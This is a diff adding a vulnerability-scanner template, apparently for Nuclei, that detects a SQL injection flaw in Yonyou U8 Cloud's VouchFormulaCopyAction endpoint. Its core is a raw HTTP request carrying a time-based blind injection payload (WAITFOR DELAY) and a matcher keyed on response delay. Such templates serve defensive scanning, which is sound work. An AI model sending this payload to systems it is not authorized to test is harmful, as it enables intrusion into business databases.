@@ -1,0 +1,35 @@
+id: yonyou-u8-cloud-VouchFormulaCopyAction-sqli
+info:
+  name: 用友U8 Cloud系统VouchFormulaCopyAction方法SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 用友U8 Cloud系统VouchFormulaCopyAction方法存在SQL注入漏洞，攻击者可获取数据库敏感信息
+  reference: 
+    - https://mp.weixin.qq.com/s/qS9Gi2KUQJ1__HY1OaOLzw
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair: 安装用友U8 Cloud最新的补丁并更新到最新版本，对接口添加身份信息验证并修改对应的方法逻辑。
+    sqlmap:
+    version:
+  tags: sqli,u8cloud
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.hbbb.innertrade.VouchFormulaCopyAction&method=execute&selCopyUnitList=1&selUnitList=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A5%27--&selItemList=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.1739.87 Safari/537.36
+        Accept: */*
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
